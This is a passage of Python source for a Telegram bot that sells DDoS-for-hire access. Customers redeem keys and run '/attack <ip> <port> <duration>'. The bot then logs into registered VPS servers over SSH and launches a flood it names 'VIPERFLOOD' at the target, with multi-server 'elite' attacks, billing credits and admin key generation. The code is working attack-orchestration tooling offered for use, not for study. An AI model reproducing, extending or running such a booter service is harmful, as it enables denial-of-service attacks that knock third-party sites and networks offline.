        log_execution(f"❌ Error connecting to {vps['ip']}: {e}")
        print(f"❌ Error connecting to {vps['ip']}: {e}")
    finally:
        thread_name = threading.current_thread().name
        if thread_name in running_channels:
            del running_channels[thread_name]
        try:
            client.close()
        except Exception:
            pass

# ---------------------------
# Command Handlers
# ---------------------------
@bot.message_handler(commands=['start'])
@safe_handler
def send_welcome(message):
    if message.from_user.id in blocked_users:
        safe_reply(message, """╔════════════════════════════╗
<b><u>🚫 ACCESS DENIED 🚫</u></b>
╚════════════════════════════╝

You are blocked from using this bot!""")
        return
    safe_reply(message, get_welcome_message())

@bot.message_handler(commands=['help'])
@safe_handler
def handle_help(message):
    """Show help menu based on user privileges"""
    user_id = message.from_user.id
    
    # Basic commands for all users
    help_text = """╔════════════════════════════╗
<b><u>🆘 HELP MENU 🆘</u></b>
╚════════════════════════════╝

<b><i>Basic Commands:</i></b>
┌─────────────────────────────
│ /start - Show welcome message
│ /help - Show this menu
│ /usekey <key> - Register your key
│ /keyinfo - Show your key info
│ /attack <ip> <port> <time> - Launch attack
└─────────────────────────────"""
    
    # Add admin commands if applicable
    if is_admin(user_id):
        help_text += """
<b><i>Admin Commands:</i></b>
┌─────────────────────────────
│ /admin - Admin panel
│ /genkey - Generate new keys
│ /listkeys - List all keys
│ /revoke <key> - Revoke a key
│ /creditsystem - Credit system info
│ /keycost - Calculate key cost
└─────────────────────────────"""
    
    # Add owner commands if applicable
    if is_owner(user_id):
        help_text += """
<b><i>Owner Commands:</i></b>
┌─────────────────────────────
│ /addvps - Add new VPS
│ /listvps - List all VPS
│ /removevps - Remove VPS
│ /addowner - Add new owner
│ /addall - Add file to all VPS
│ /removeall - Remove file from all VPS
│ /showfiles - List files on VPS
└─────────────────────────────"""
    
    sanitized_help_text = sanitize_message(help_text)
    safe_reply(message, sanitized_help_text)


@bot.message_handler(commands=['attack'])
@user_only
@approved_chat_only
@safe_handler
def handle_attack(message):
    """Handle attack command with enhanced validation, cooldown, and elite attack system"""
    try:
        # Validate command format
        parts = message.text.split()
        if len(parts) != 4:
            safe_reply(message, """╔════════════════════════════╗
<b><u>❌ INVALID FORMAT ❌</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Usage:</b> /attack <ip> <port> <duration>
│ Example: /attack 1.1.1.1 80 60
└─────────────────────────────""")
            return

        target_ip = parts[1]
        target_port = parts[2]
        
        try:
            duration = int(parts[3])
            if duration <= 0:
                raise ValueError("Duration must be positive")
        except ValueError:
            safe_reply(message, """╔════════════════════════════╗
<b><u>❌ INVALID DURATION ❌</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ Duration must be a positive
│ integer (in seconds)
└─────────────────────────────""")
            return

        # Validate IP format
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target_ip):
            safe_reply(message, """╔════════════════════════════╗
<b><u>❌ INVALID IP FORMAT ❌</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ IP must be in format:
│ XXX.XXX.XXX.XXX
│ (1-3 digits per segment)
└─────────────────────────────""")
            return

        # Validate port range
        try:
            port = int(target_port)
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            safe_reply(message, """╔════════════════════════════╗
<b><u>❌ INVALID PORT ❌</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ Port must be between
│ 1 and 65535
└─────────────────────────────""")
            return

        # Check user's key restrictions
        user_id_str = str(message.from_user.id)
        if user_id_str in users:
            user_key = users[user_id_str]
            if user_key in keys:
                max_allowed = keys[user_key]["max_duration"]
                if duration > max_allowed:
                    safe_reply(message, f"""╔════════════════════════════╗
<b><u>⚠️ DURATION LIMIT ⚠️</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ Your key allows max:
│ {max_allowed} seconds
│ You requested: {duration}s
└─────────────────────────────""")
                    return

        # Check for elite status
        is_elite = duration > 240 and str(message.from_user.id) in elite_users
        
        if is_elite and len(vps_servers) > 1:
            safe_reply(message, f"🚀 ELITE ATTACK: Chunking {duration}s across {len(vps_servers)} VPS")
            threading.Thread(
                target=execute_chunked_attack,
                args=(target_ip, target_port, duration),
                daemon=True
            ).start()
            log_attack(message.from_user.id, target_ip, target_port, duration, len(vps_servers) if vps_servers else 1)
            send_attack_feedback_request(message, target_ip, target_port, duration)
            return

        # Clean up expired cooldowns
        current_time = datetime.now()
        expired_cooldowns = [
            k for k, v in attack_cooldowns.items() 
            if v < current_time
        ]
        for k in expired_cooldowns:
            del attack_cooldowns[k]

        # Check cooldown for this target
        cooldown_key = f"{target_ip}:{port}"
        if cooldown_key in attack_cooldowns:
            remaining = attack_cooldowns[cooldown_key] - current_time
            if remaining.total_seconds() > 0:
                safe_reply(message, f"""╔════════════════════════════╗
<b><u>⏳ COOLDOWN ACTIVE ⏳</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ Target on cooldown:
│ <code>{cooldown_key}</code>
│ Time remaining: {format_timedelta(remaining)}
└─────────────────────────────""")
                return

        # Set new cooldown
        attack_cooldowns[cooldown_key] = current_time + timedelta(seconds=global_cooldown)

        # Normal attack logic if not elite
        safe_reply(message, f"""╔════════════════════════════╗
<b><u>🚀 ATTACK INITIATED 🚀</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Target:</b> <code>{target_ip}:{port}</code>
│ <b>Duration:</b> {duration} seconds
│ <b>VPS Count:</b> {len(vps_servers) or 1}
│ <b>Method:</b> VIPERFLOOD
└─────────────────────────────

<i>You will be notified when completed</i>""")

        # Execute attack
        def execute_attack():
            try:
                # If no external VPS, use local
                if not vps_servers:
                    execute_own_vps_command(target_ip, port, duration)
                    return

                # Execute on all VPS
                cancel_event.clear()
                threads = []
                for vps in vps_servers:
                    thread = threading.Thread(
                        target=execute_command,
                        args=(vps, target_ip, port, duration),
                        daemon=True
                    )
                    thread.start()
                    threads.append(thread)

                # Wait for completion or cancellation
                for thread in threads:
                    thread.join(duration)

                # Send completion notice
                success_count = len(vps_servers) if vps_servers else 1
                safe_reply(message, f"""╔════════════════════════════╗
<b><u>✅ ATTACK COMPLETED ✅</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Target:</b> <code>{target_ip}:{port}</code>
│ <b>Duration:</b> {duration} seconds
│ <b>Success:</b> {success_count} nodes
│ <b>Cooldown:</b> {global_cooldown}s
└─────────────────────────────""")

            except Exception as e:
                log_execution(f"Attack error: {str(e)}")
                safe_reply(message, """╔════════════════════════════╗
<b><u>⚠️ ATTACK ERROR ⚠️</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ Some nodes failed to execute
│ Check logs for details
└─────────────────────────────""")

        # Run attack in background
        threading.Thread(target=execute_attack, daemon=True).start()

        log_attack(message.from_user.id, target_ip, target_port, duration, len(vps_servers) if vps_servers else 1)
        send_attack_feedback_request(message, target_ip, target_port, duration)

    except Exception as e:
        log_execution(f"Attack handler error: {traceback.format_exc()}")
        safe_reply(message, """╔════════════════════════════╗
<b><u>❌ SYSTEM ERROR ❌</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ Failed to process attack
│ Please try again later
└─────────────────────────────""")
        
@bot.message_handler(commands=['addvps'])
@owner_only
@private_chat_only
@safe_handler
def add_vps_handler(message):
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /addvps <ip> <username> <password>
└─────────────────────────────""")
        return
    ip, username, password = command_parts[1:4]
    new_vps = {'ip': ip, 'username': username, 'password': password}
    vps_servers.append(new_vps)
    save_json(VPS_FILE, vps_servers)
    safe_reply(message, get_vps_added_message(ip))

@bot.message_handler(commands=['listvps'])
@owner_only
@safe_handler
def list_vps_handler(message):
    if not vps_servers:
        safe_reply(message, """<b>ℹ️ No VPS Registered</b>
┌─────────────────────────────
│ Use /addvps to add servers
└─────────────────────────────""")
        return
    reply = """╔════════════════════════════╗
<b><u>🖥️ ACTIVE VPS SERVERS 🖥️</u></b>
╚════════════════════════════╝
"""
    for idx, vps in enumerate(vps_servers, 1):
        reply += f"""┌─────────────────────────────
│ <b>{idx}.</b> IP: <code>{vps['ip']}</code>
│ Username: <code>{vps['username']}</code>
└─────────────────────────────
"""
    safe_reply(message, reply)

@bot.message_handler(commands=['removevps'])
@owner_only
@private_chat_only
@safe_handler
def remove_vps_handler(message):
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /removevps <ip>
└─────────────────────────────""")
        return
    ip_to_remove = command_parts[1]
    removed = False
    for vps in vps_servers:
        if vps['ip'] == ip_to_remove:
            vps_servers.remove(vps)
            removed = True
            break
    if removed:
        save_json(VPS_FILE, vps_servers)
        safe_reply(message, f"""<b>✅ VPS Removed</b>
┌─────────────────────────────
│ IP: <code>{ip_to_remove}</code>
└─────────────────────────────""")
    else:
        safe_reply(message, f"""<b>❌ VPS Not Found</b>
┌─────────────────────────────
│ IP: <code>{ip_to_remove}</code>
└─────────────────────────────""")

@bot.message_handler(commands=['updatevps'])
@owner_only
@private_chat_only
@safe_handler
def update_vps_handler(message):
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /updatevps <ip> <new_username> <new_password>
└─────────────────────────────""")
        return
    ip, new_username, new_password = command_parts[1:4]
    updated = False
    for vps in vps_servers:
        if vps['ip'] == ip:
            vps['username'] = new_username
            vps['password'] = new_password
            updated = True
            break
    if updated:
        save_json(VPS_FILE, vps_servers)
        safe_reply(message, f"""<b>✅ VPS Updated</b>
┌─────────────────────────────
│ IP: <code>{ip}</code>
│ New Username: <code>{new_username}</code>
└─────────────────────────────""")
    else:
        safe_reply(message, f"""<b>❌ VPS Not Found</b>
┌─────────────────────────────
│ IP: <code>{ip}</code>
└─────────────────────────────""")

@bot.message_handler(commands=['status'])
@owner_only
@safe_handler
def status_vps_handler(message):
    status_report = """╔════════════════════════════╗
<b><u>📡 VPS STATUS REPORT 📡</u></b>
╚════════════════════════════╝
"""
    for vps in vps_servers:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=5)
            status_report += f"""┌─────────────────────────────
│ IP: <code>{vps['ip']}</code>
│ Status: <b>🟢 ONLINE</b> ✅
└─────────────────────────────
"""
            client.close()
        except Exception:
            status_report += f"""┌─────────────────────────────
│ IP: <code>{vps['ip']}</code>
│ Status: <b>🔴 OFFLINE</b> ❌
└─────────────────────────────
"""
    safe_reply(message, status_report)

@bot.message_handler(commands=['logs'])
@owner_only
@safe_handler
def show_logs_handler(message):
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, 'r') as f:
                logs = f.read()
            safe_reply(message, f"""╔════════════════════════════╗
<b><u>📜 SYSTEM LOGS 📜</u></b>
╚════════════════════════════╝

<pre>{logs}</pre>""")
        except Exception as e:
            safe_reply(message, f"""<b>❌ Error Reading Logs</b>
┌─────────────────────────────
│ {e}
└─────────────────────────────""")
    else:
        safe_reply(message, """<b>ℹ️ No Logs Available</b>
┌─────────────────────────────
│ Log file not found
└─────────────────────────────""")

@bot.message_handler(commands=['genkey'])
@owner_only
@private_chat_only
@safe_handler
def generate_key(message):
    command_parts = message.text.split()
    if len(command_parts) != 5:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /genkey <validity> <max_users> <max_duration> <prefix>
└─────────────────────────────""")
        return

    validity_arg, max_users_arg, max_duration_arg, prefix_arg = command_parts[1:5]
    validity_lower = validity_arg.lower()

    try:
        number = int(''.join(filter(str.isdigit, validity_arg)))
    except Exception:
        safe_reply(message, """<b>❌ Invalid Validity</b>
┌─────────────────────────────
│ Include a number (e.g., 1day)
└─────────────────────────────""")
        return

    if "day" in validity_lower:
        expiration = datetime.now() + timedelta(days=number)
    elif "min" in validity_lower:
        expiration = datetime.now() + timedelta(minutes=number)
    else:
        safe_reply(message, """<b>❌ Invalid Format</b>
┌─────────────────────────────
│ Use 'day' or 'min' suffix
└─────────────────────────────""")
        return

    try:
        max_users = int(''.join(filter(str.isdigit, max_users_arg)))
        max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
    except Exception:
        safe_reply(message, """<b>❌ Invalid Parameters</b>
┌─────────────────────────────
│ Max users/duration must be numbers
└─────────────────────────────""")
        return

    prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
    suffix = uuid.uuid4().hex[:6].upper()
    new_key = prefix + suffix

    # Mark the key as elite if the duration is greater than 240 seconds
    is_elite = max_duration > 240

    # Add the new key with the is_elite flag
    keys[new_key] = {
        "expires_at": expiration.isoformat(),
        "max_users": max_users,
        "max_duration": max_duration,
        "used": [],
        "generated_by": message.from_user.id,
        "is_elite": is_elite  # Add this line to mark elite keys
    }

    # If the key is elite, add the usear to the elite_users list
    if is_elite:
        elite_users[str(message.from_user.id)] = True
        save_json(ELITE_USERS_FILE, elite_users)

    save_json(KEYS_FILE, keys)
    safe_reply(message, get_key_generated_message(new_key, expiration, max_users, max_duration))

@bot.message_handler(commands=['usekey'])
@safe_handler
def use_key_handler(message):
    """Handle key registration with improved expiration checking and cleanup"""
    try:
        # Check command format
        command_parts = message.text.split()
        if len(command_parts) != 2:
            safe_reply(message, """╔════════════════════════════╗
<b><u>❌ INVALID FORMAT ❌</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Usage:</b> /usekey <key>
│ Example: /usekey PREMIUM-ABC123
└─────────────────────────────""")
            return

        provided_key = command_parts[1].strip()
        user_id_str = str(message.from_user.id)

        # First clean up all expired keys
        expired_keys = []
        for key, key_data in list(keys.items()):
            try:
                expires_at = datetime.fromisoformat(key_data["expires_at"])
                if datetime.now() > expires_at:
                    expired_keys.append(key)
            except Exception as e:
                log_execution(f"Error checking key expiration for {key}: {e}")

        # Remove expired keys and update affected users
        if expired_keys:
            for key in expired_keys:
                # Remove key from users who were using it
                users_to_remove = [uid for uid, k in users.items() if k == key]
                for uid in users_to_remove:
                    del users[uid]
                # Remove the key itself
                del keys[key]
            
            save_json(KEYS_FILE, keys)
            save_json(USERS_FILE, users)

        # Check if key exists after cleanup
        if provided_key not in keys:
            safe_reply(message, """╔════════════════════════════╗
<b><u>🔑 KEY NOT FOUND 🔑</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ The key you provided:
│ <code>{}</code>
│ is invalid or expired
└─────────────────────────────""".format(provided_key))
            return

        key_data = keys[provided_key]

        # Check if user is already registered with any key
        if user_id_str in users:
            current_key = users[user_id_str]
            if current_key == provided_key:
                safe_reply(message, """╔════════════════════════════╗
<b><u>ℹ️ ALREADY REGISTERED ℹ️</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ You're already using this key
└─────────────────────────────""")
            else:
                safe_reply(message, """╔════════════════════════════╗
<b><u>⚠️ KEY CONFLICT ⚠️</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ You're already registered with:
│ <code>{}</code>
│ Use /keyinfo to see details
└─────────────────────────────""".format(current_key))
            return

        # Check user limit
        if len(key_data["used"]) >= key_data["max_users"]:
            safe_reply(message, """╔════════════════════════════╗
<b><u>🚫 KEY LIMIT REACHED 🚫</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ This key has reached its maximum
│ number of users ({}/{})
└─────────────────────────────""".format(len(key_data["used"]), key_data["max_users"]))
            return

        # Register the user
        key_data["used"].append(user_id_str)
        users[user_id_str] = provided_key
        
        # Save changes
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)

        # Prepare key info
        expires_at = datetime.fromisoformat(key_data["expires_at"])
        time_left = expires_at - datetime.now()
        time_left_str = format_timedelta(time_left)

        safe_reply(message, """╔════════════════════════════╗
<b><u>✅ KEY REGISTERED ✅</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Key:</b> <code>{}</code>
│ <b>Time Left:</b> {}
│ <b>Max Duration:</b> {} seconds
│ <b>Users:</b> {}/{}
└─────────────────────────────

<i>Use /keyinfo to see details anytime</i>""".format(
            provided_key,
            time_left_str,
            key_data['max_duration'],
            len(key_data["used"]),
            key_data["max_users"]
        ))

    except Exception as e:
        log_execution(f"Error in use_key_handler: {traceback.format_exc()}")
        safe_reply(message, """╔════════════════════════════╗
<b><u>❌ SYSTEM ERROR ❌</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ An error occurred while
│ processing your key.
│ Please try again later.
└─────────────────────────────""")
        
@bot.message_handler(commands=['keyinfo'])
@safe_handler
def key_info_handler(message):
    user_id_str = str(message.from_user.id)
    if user_id_str not in users:
        safe_reply(message, """<b>ℹ️ No Key Registered</b>
┌─────────────────────────────
│ Use /usekey <key> first
└─────────────────────────────""")
        return
    user_key = users[user_id_str]
    if user_key not in keys:
        safe_reply(message, """<b>❌ Invalid Key</b>
┌─────────────────────────────
│ Register again with /usekey
└─────────────────────────────""")
        return
    details = keys[user_key]
    info_text = f"""╔════════════════════════════╗
<b><u>🔑 KEY INFORMATION 🔑</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Key:</b> <code>{user_key}</code>
│ <b>Expires at:</b> {details['expires_at']}
│ <b>Max Users:</b> {details['max_users']}
│ <b>Max Duration:</b> {details['max_duration']}s
│ <b>Users registered:</b> {len(details['used'])}
└─────────────────────────────"""
    safe_reply(message, info_text)

@bot.message_handler(commands=['listkeys'])
@owner_only
@safe_handler
def list_keys_handler(message):
    if not keys:
        safe_reply(message, """<b>ℹ️ No Keys Generated</b>
┌─────────────────────────────
│ Use /genkey to create keys
└─────────────────────────────""")
        return
    reply = """╔════════════════════════════╗
<b><u>🔑 GENERATED KEYS 🔑</u></b>
╚════════════════════════════╝
"""
    for key_val, details in keys.items():
        reply += f"""┌─────────────────────────────
│ <b>Key:</b> <code>{key_val}</code>
│ <b>Expires:</b> {details['expires_at']}
│ <b>Max Users:</b> {details['max_users']}
│ <b>Max Duration:</b> {details['max_duration']}s
└─────────────────────────────
"""
    safe_reply(message, reply)

@bot.message_handler(commands=['revoke'])
@owner_only
@private_chat_only
@safe_handler
def revoke_key_handler(message):
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /revoke <key>
└─────────────────────────────""")
        return
    key_to_revoke = command_parts[1].strip()
    if key_to_revoke in keys:
        # Remove all users associated with this key
        users_to_remove = [uid for uid, k in users.items() if k == key_to_revoke]
        for uid in users_to_remove:
            del users[uid]
        
        # Remove the key itself
        del keys[key_to_revoke]
        
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)
        
        safe_reply(message, f"""<b>✅ Key Revoked</b>
┌─────────────────────────────
│ <code>{key_to_revoke}</code>
│ Removed {len(users_to_remove)} users
└─────────────────────────────""")
    else:
        safe_reply(message, """<b>❌ Key Not Found</b>
┌─────────────────────────────
│ No such key exists
└─────────────────────────────""")
        
@bot.message_handler(commands=['blockuser'])
@owner_only
@private_chat_only
@safe_handler
def block_user_handler(message):
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /blockuser <user_id>
└─────────────────────────────""")
        return
    try:
        user_to_block = int(command_parts[1])
    except ValueError:
        safe_reply(message, """<b>❌ Invalid User ID</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
        return
    if user_to_block not in blocked_users:
        blocked_users.append(user_to_block)
        save_json(BLOCKED_USERS_FILE, blocked_users)
        safe_reply(message, f"""<b>✅ User Blocked</b>
┌─────────────────────────────
│ ID: <code>{user_to_block}</code>
└─────────────────────────────""")
    else:
        safe_reply(message, """<b>ℹ️ Already Blocked</b>
┌─────────────────────────────
│ User is already blocked
└─────────────────────────────""")

@bot.message_handler(commands=['unblockuser'])
@owner_only
@private_chat_only
@safe_handler
def unblock_user_handler(message):
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /unblockuser <user_id>
└─────────────────────────────""")
        return
    try:
        user_to_unblock = int(command_parts[1])
    except ValueError:
        safe_reply(message, """<b>❌ Invalid User ID</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
        return
    if user_to_unblock in blocked_users:
        blocked_users.remove(user_to_unblock)
        save_json(BLOCKED_USERS_FILE, blocked_users)
        safe_reply(message, f"""<b>✅ User Unblocked</b>
┌─────────────────────────────
│ ID: <code>{user_to_unblock}</code>
└─────────────────────────────""")
    else:
        safe_reply(message, """<b>ℹ️ Not Blocked</b>
┌─────────────────────────────
│ User is not blocked
└─────────────────────────────""")

@bot.message_handler(commands=['activeusers'])
@owner_only
@safe_handler
def active_users_handler(message):
    if not users:
        safe_reply(message, """<b>ℹ️ No Active Users</b>
┌─────────────────────────────
│ No users registered yet
└─────────────────────────────""")
        return
    reply = """╔════════════════════════════╗
<b><u>👥 ACTIVE USERS 👥</u></b>
╚════════════════════════════╝
"""
    for user_id, key in users.items():
        reply += f"""┌─────────────────────────────
│ User ID: <code>{user_id}</code>
│ Key: <code>{key}</code>
└─────────────────────────────
"""
    safe_reply(message, reply)

@bot.message_handler(commands=['keyadmin'])
@owner_only
@safe_handler
def key_admin_handler(message):
    if not keys:
        safe_reply(message, """<b>ℹ️ No Keys Generated</b>
┌─────────────────────────────
│ Use /genkey to create keys
└─────────────────────────────""")
        return
    reply = """╔════════════════════════════╗
<b><u>🔑 KEY ADMIN INFO 🔑</u></b>
╚════════════════════════════╝
"""
    for key_val, details in keys.items():
        gen_by = details.get("generated_by", "N/A")
        reply += f"""┌─────────────────────────────
│ <b>Key:</b> <code>{key_val}</code>
│ <b>Generated by:</b> <code>{gen_by}</code>
└─────────────────────────────
"""
    safe_reply(message, reply)

@bot.message_handler(commands=['cancel'])
@owner_only
@safe_handler
def cancel_execution_handler(message):
    cancel_event.set()
    for thread_name, channel in list(running_channels.items()):
        try:
            channel.close()
        except Exception:
            pass
    safe_reply(message, """<b>🛑 Cancellation Signal Sent</b>
┌─────────────────────────────
│ All active attacks stopping
└─────────────────────────────""")
    time.sleep(2)
    cancel_event.clear()

@bot.message_handler(commands=['admin'])
@admin_only
@safe_handler
def admin_panel_handler(message):
    keyboard = types.InlineKeyboardMarkup()
    button_genkey = types.InlineKeyboardButton(text="✨ Generate Key", callback_data="admin_genkey")
    button_listkeys = types.InlineKeyboardButton(text="📜 List Keys", callback_data="admin_listkeys")
    button_revoke = types.InlineKeyboardButton(text="❌ Revoke Key", callback_data="admin_revoke")
    keyboard.row(button_genkey, button_listkeys)
    keyboard.row(button_revoke)
    admin_text = """╔════════════════════════════╗
<b><u>🛠️ ADMIN PANEL 🛠️</u></b>
╚════════════════════════════╝

Select an action:"""
    safe_send(message.chat.id, admin_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
@safe_handler
def admin_callback(call):
    chat_id = call.message.chat.id if call.message else call.from_user.id
    if call.data == "admin_genkey":
        bot.answer_callback_query(call.id, text="⏳ Please provide parameters...")
        safe_send(chat_id,
                  """<b>📝 Key Generation Parameters</b>
┌─────────────────────────────
│ Send as: <code>validity max_users max_duration prefix</code>
│ Example: <code>1day 10user 60duration MYKEY</code>
└─────────────────────────────""")
        bot.register_next_step_handler(call.message, admin_generate_key_step)
    elif call.data == "admin_listkeys":
        bot.answer_callback_query(call.id, text="⏳ Loading keys...")
        if not keys:
            safe_send(chat_id, """<b>ℹ️ No Keys Generated</b>
┌─────────────────────────────
│ Use /genkey to create keys
└─────────────────────────────""")
        else:
            reply = """╔════════════════════════════╗
<b><u>🔑 GENERATED KEYS 🔑</u></b>
╚════════════════════════════╝
"""
            for key_val, details in keys.items():
                reply += f"""┌─────────────────────────────
│ <b>Key:</b> <code>{key_val}</code>
│ <b>Expires:</b> {details['expires_at']}
│ <b>Max Users:</b> {details['max_users']}
│ <b>Max Duration:</b> {details['max_duration']}s
└─────────────────────────────
"""
            safe_send(chat_id, reply)
    elif call.data == "admin_revoke":
        bot.answer_callback_query(call.id, text="⏳ Awaiting key to revoke...")
        safe_send(chat_id, """<b>🗑️ Revoke Key</b>
┌─────────────────────────────
│ Send as: <code>revoke KEY_VALUE</code>
└─────────────────────────────""")
        bot.register_next_step_handler(call.message, admin_revoke_key)

def admin_generate_key_step(message):
    admin_id = message.from_user.id
    params = message.text.split()
    if len(params) != 4:
        safe_reply(message, """<b>❌ Incorrect Format</b>
┌─────────────────────────────
│ Send: validity max_users max_duration prefix
└─────────────────────────────""")
        return
    validity_arg, max_users_arg, max_duration_arg, prefix_arg = params
    validity_lower = validity_arg.lower()
    try:
        number = int(''.join(filter(str.isdigit, validity_arg)))
    except Exception:
        safe_reply(message, """<b>❌ Error Parsing Validity</b>
┌─────────────────────────────
│ Include a number (e.g., '1day')
└─────────────────────────────""")
        return
    if "day" in validity_lower:
        minutes = number * 24 * 60
        validity_cost = (minutes + 14) // 15
        expiration = datetime.now() + timedelta(days=number)
    elif "min" in validity_lower:
        minutes = number
        validity_cost = (minutes + 14) // 15
        expiration = datetime.now() + timedelta(minutes=number)
    else:
        safe_reply(message, """<b>❌ Invalid Validity Format</b>
┌─────────────────────────────
│ Use 'day' or 'min' suffix
└─────────────────────────────""")
        return
    try:
        max_users = int(''.join(filter(str.isdigit, max_users_arg)))
        max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
    except Exception:
        safe_reply(message, """<b>❌ Error Parsing Parameters</b>
┌─────────────────────────────
│ Max users/duration must be numbers
└─────────────────────────────""")
        return
    users_cost = max_users
    duration_cost = (max_duration + 29) // 30
    total_cost = validity_cost + users_cost + duration_cost
    current_credits = get_credit_balance(admin_id)
    if current_credits < total_cost:
        safe_reply(message, f"""<b>🚫 Insufficient Credits</b>
┌─────────────────────────────
│ Cost: {total_cost}
│ You have: {current_credits}
└─────────────────────────────""")
        return
    prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
    suffix = uuid.uuid4().hex[:6].upper()
    new_key = prefix + suffix
    keys[new_key] = {
        "expires_at": expiration.isoformat(),
        "max_users": max_users,
        "max_duration": max_duration,
        "used": [],
        "generated_by": admin_id
    }
    save_json(KEYS_FILE, keys)
    deduct_credit(admin_id, total_cost, reason="Key Generation")
    reply = f"""╔════════════════════════════╗
<b><u>🔑 KEY GENERATED 🔑</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Key:</b> <code>{new_key}</code>
│ <b>Expires at:</b> {expiration}
│ <b>Max Users:</b> {max_users}
│ <b>Max Duration:</b> {max_duration}s
└─────────────────────────────

┌─────────────────────────────
│ <b>Cost Breakdown:</b>
│ • Validity: {validity_cost} credits
│ • Users: {users_cost} credits
│ • Duration: {duration_cost} credits
│ <b>Total Cost:</b> {total_cost} credits
│ <b>Remaining Credits:</b> {get_credit_balance(admin_id)}
└─────────────────────────────"""
    safe_reply(message, reply)

def admin_revoke_key(message):
    parts = message.text.split()
    if len(parts) != 2 or parts[0].lower() != "revoke":
        safe_reply(message, """<b>❌ Incorrect Format</b>
┌─────────────────────────────
│ Send: revoke KEY_VALUE
└─────────────────────────────""")
        return
    key_to_revoke = parts[1].strip()
    if key_to_revoke in keys:
        del keys[key_to_revoke]
        save_json(KEYS_FILE, keys)
        safe_reply(message, f"""<b>✅ Key Revoked</b>
┌─────────────────────────────
│ <code>{key_to_revoke}</code>
└─────────────────────────────""")
    else:
        safe_reply(message, """<b>❌ Key Not Found</b>
┌─────────────────────────────
│ No such key exists
└─────────────────────────────""")

@bot.message_handler(commands=['checkcredits'])
@admin_only
@safe_handler
def check_credits_handler(message):
    admin_id = message.from_user.id
    balance = get_credit_balance(admin_id)
    history = get_credit_history(admin_id)
    history_text = "\n".join([f"{item['timestamp']}: {item['type']} {item['amount']} ({item.get('reason','')})" for item in history])
    reply = f"""╔════════════════════════════╗
<b><u>💳 CREDIT BALANCE 💳</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Your Balance:</b> {balance} credits
└─────────────────────────────

╔════════════════════════════╗
<b><u>📝 TRANSACTION HISTORY 📝</u></b>
╚════════════════════════════╝

<pre>{history_text}</pre>"""
    safe_reply(message, reply)

@bot.message_handler(commands=['addcredit'])
@owner_only
@private_chat_only
@safe_handler
def add_credit_command(message):
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /addcredit <admin_id> <amount>
└─────────────────────────────""")
        return
    target_id = command_parts[1]
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_reply(message, """<b>❌ Invalid Amount</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
        return
    add_credit(target_id, amount, reason="Manual credit addition")
    safe_reply(message, f"""<b>✅ Credits Added</b>
┌─────────────────────────────
│ To: {target_id}
│ Amount: {amount}
│ New Balance: {get_credit_balance(target_id)}
└─────────────────────────────""")

@bot.message_handler(commands=['addcredit'])
@owner_only
@private_chat_only
@safe_handler
def add_credit_command(message):
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /addcredit <admin_id> <amount>
└─────────────────────────────""")
        return
    target_id = command_parts[1]
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_reply(message, """<b>❌ Invalid Amount</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
        return
    add_credit(target_id, amount, reason="Manual credit addition")
    safe_reply(message, f"""<b>✅ Credits Added</b>
┌─────────────────────────────
│ To: {target_id}
│ Amount: {amount}
│ New Balance: {get_credit_balance(target_id)}
└─────────────────────────────""")

@bot.message_handler(commands=['addadmin'])
@owner_only
@private_chat_only
@safe_handler
def add_admin_handler(message):
